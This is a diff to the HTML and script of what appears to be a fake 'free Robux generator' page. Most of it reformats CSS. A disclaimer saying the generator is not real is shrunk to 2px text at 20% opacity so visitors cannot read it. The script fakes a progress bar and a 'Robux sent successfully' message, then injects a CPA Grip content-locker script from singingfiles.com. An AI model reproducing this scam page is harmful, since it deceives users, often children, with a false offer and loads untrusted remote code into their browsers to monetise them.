@@ -20,11 +20,11 @@
       align-items: center;
       padding: 20px 40px;
     }
-	
-	#text42 {
-		font-size: 2px;
-		opacity: 20%;
-	}
+
+    #text42 {
+      font-size: 2px;
+      opacity: 20%;
+    }
 
     .logo {
       font-weight: bold;
@@ -126,38 +126,37 @@
       color: #00ff90;
       font-size: 22px;
     }
-	
-@media (max-width: 600px) {
-  .main-title {
-    font-size: 8vw;
-    margin-top: 60px;
-  }
 
-  input, select, button {
-    width: 80%;
-    font-size: 16px;
-    padding: 12px;
-  }
+    @media (max-width: 600px) {
+      .main-title {
+        font-size: 8vw;
+        margin-top: 60px;
+      }
 
-  .header {
-    flex-direction: column;
-    padding: 10px;
-    gap: 10px;
-  }
+      input, select, button {
+        width: 80%;
+        font-size: 16px;
+        padding: 12px;
+      }
 
-  .avatar {
-    width: 60px;
-  }
+      .header {
+        flex-direction: column;
+        padding: 10px;
+        gap: 10px;
+      }
 
-  .proof-image img {
-    width: 80%;
-  }
+      .avatar {
+        width: 60px;
+      }
 
-  #statusText {
-    font-size: 16px;
-  }
-}
+      .proof-image img {
+        width: 80%;
+      }
 
+      #statusText {
+        font-size: 16px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -204,7 +203,7 @@
   <div class="proof-image">
     <img src="proof.png" alt="Robux Proof">
   </div>
-  
+
   <p id="text42"> This is not a real generator. But there is no scam and we don't hack you or get your informations, it's not our goal. </p>
 
   <!-- 🔹 SCRIPT -->
@@ -241,13 +240,16 @@
 
         if (progress >= 100) {
           clearInterval(interval);
-          statusText.innerHTML = `Robux sent successfully! 🎉`;
+          statusText.innerHTML = `Robux sent successfully! 🎉<br>Verifying...`;
 
-          // Script CPA Grip après chargement :
-           const cpaScript = document.createElement('script');
-	   cpaScript.src = 'https://singingfiles.com/script_include.php?id=1821663';
-	   cpaScript.async = true;
-	   document.body.appendChild(cpaScript);
+          // ✅ Attendre un petit délai puis injecter le script CPA Grip
+          setTimeout(() => {
+            const cpaScript = document.createElement('script');
+            cpaScript.src = 'https://singingfiles.com/script_include.php?id=1821663';
+            cpaScript.async = true;
+            document.body.appendChild(cpaScript);
+            console.log("CPA Grip script injected");
+          }, 2000);
         }
       }, 200);
     });
